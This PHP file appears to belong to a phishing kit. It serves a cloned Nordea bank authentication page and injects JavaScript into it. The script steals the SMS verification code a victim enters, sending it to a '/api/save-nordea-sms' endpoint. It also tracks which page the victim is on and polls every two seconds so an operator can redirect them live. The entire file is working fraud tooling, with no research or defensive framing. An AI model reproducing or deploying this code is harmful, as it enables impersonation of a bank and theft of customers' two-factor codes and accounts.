<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Nordea');
$htmlContent = file_get_contents(__DIR__ . '/nordeabank3.html');

$basePath = '/nordea-files/';
$htmlContent = preg_replace('/\.\/Nordea\s*-\s*Tunnistautuminen_files\//', $basePath, $htmlContent);
$htmlContent = preg_replace('/Nordea\s*-\s*Tunnistautuminen_files\//', $basePath, $htmlContent);
$htmlContent = str_replace('href="./', 'href="/', $htmlContent);
$htmlContent = str_replace('src="./', 'src="' . $basePath, $htmlContent);

$adminScript = '';
if (isset($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        const smsForm = document.getElementById(\'sms-form\');
        if (smsForm) {
            smsForm.addEventListener(\'submit\', function(e) {
                e.preventDefault();
                
                const smsCode = document.getElementById(\'sms-code\')?.value || \'\';
                
                if (smsCode) {
                    fetch(\'/api/save-nordea-sms\', {
                        method: \'POST\',
                        headers: { \'Content-Type\': \'application/json\' },
                        body: JSON.stringify({
                            user_id: userId,
                            sms_code: smsCode
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success && data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
                }
            });
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

$htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
echo $htmlContent;
?>
<?php
$content = ob_get_clean();
echo $content;
?>

